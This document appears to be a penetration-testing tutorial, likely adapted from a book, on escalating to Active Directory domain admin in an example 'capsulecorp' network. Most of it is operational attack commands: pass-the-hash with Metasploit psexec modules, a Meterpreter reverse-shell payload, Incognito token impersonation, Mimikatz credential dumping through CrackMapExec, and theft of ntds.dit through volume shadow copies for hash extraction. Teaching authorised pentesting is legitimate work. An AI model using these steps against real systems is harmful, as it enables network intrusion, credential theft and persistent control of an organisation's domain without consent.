### Domain Administration and Privilege Escalation

#### 1. Identifying Domain Admin User Accounts
This domain has three users with domain admin privileges. The next step is to locate systems where these users are actively logged in. One effective method is to use the `psexec_command` Metasploit module to run the `qwinsta` command on all accessible Windows systems. The `qwinsta` command provides information about currently active user sessions, which helps identify if a domain admin is logged in. For more details on `qwinsta`, refer to the Microsoft documentation at [http://mng.bz/lXY6](http://mng.bz/lXY6).

#### 2. Locating Logged-in Domain Admin Users
In large enterprise networks, searching for domain admin accounts can be challenging. For instance, imagine a company with over 10,000 computer systems and only four domain admin accounts among 20,000+ user accounts. If you have obtained local administrator account password hashes from various level-one systems, you can use Pass-the-Hash to gain access to hundreds of servers and workstations. You then need to check each system to see if a domain admin is logged in.

Using the `psexec_command` module in Metasploit, which leverages threading capabilities, you can accomplish this task efficiently. Here’s how to load and configure the module:

```plaintext
msfconsole
use auxiliary/admin/smb/psexec_command
set rhosts file:/path/to/windows.txt
set smbdomain .
set smbuser Administrator
set smbpass [LMHASH:NTLMHASH]
set threads 10
set command qwinsta
set verbose false
run
```

The output will display the results of the `qwinsta` command on all accessible systems. To manage the output, create a spool file using the `spool /path/to/filename` command, which logs all MSF activity for later analysis with `grep`.

#### 3. Obtaining Domain Admin Privileges
Once you identify a system with a domain admin logged in, the next step is to access that system. For this, use the `psexec_psh` module, which uses PowerShell to open a Meterpreter session. Here’s how to do it:

```plaintext
msfconsole
use exploit/windows/smb/psexec_psh
set rhosts 10.0.10.207
set smbdomain .
set smbuser Administrator
set smbpass [LMHASH:NTLMHASH]
set payload windows/x64/meterpreter/reverse_winhttps
exploit
```

After gaining access, you can use two methods to obtain domain admin privileges:

1. **Impersonating Logged-in Users with Incognito**:
   - Load the Incognito extension in your Meterpreter session.
   - List available tokens and impersonate the desired user.

   ```plaintext
   load incognito
   list_tokens -u
   impersonate_token capsulecorp\\serveradmin
   ```

   Verify the impersonation by running `whoami` in a shell.

2. **Harvesting Clear-text Credentials with Mimikatz**:
   - Use CrackMapExec (CME) to run Mimikatz and extract clear-text credentials.

   ```plaintext
   cme smb 10.0.10.207 --local-auth -u administrator -H [hash] -M mimikatz
   ```

   This method is preferred as it provides longer-lasting credentials and allows access to any system in the network.

#### 4. Extracting the ntds.dit Database
To maintain persistent access, it’s crucial to obtain all Active Directory password hashes. These are stored in the `ntds.dit` file on the domain controller. Here’s how to locate and extract the `ntds.dit` file:

1. **Locate the Domain Controller**:
   - Use the `ping` command to find the IP address of the domain controller.

   ```plaintext
   cme smb 10.0.10.207 --local-auth -u administrator -H [hash] -x "cmd /c ping capsulecorp.local"
   ```

2. **Bypass Restrictions with Volume Shadow Copies (VSC)**:
   - Check for existing VSCs or create one using the `vssadmin` command.
   - Copy the `ntds.dit` file from the VSC.

   ```plaintext
   vssadmin create shadow /for=C:
   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\temp\ntds.dit
   ```

3. **Extract Password Hashes**:
   - Use tools like `secretsdump.py` from Impacket to extract the password hashes from the `ntds.dit` file.

By following these steps, you can effectively identify, access, and control systems with domain admin privileges, ensuring long-term access to the target environment.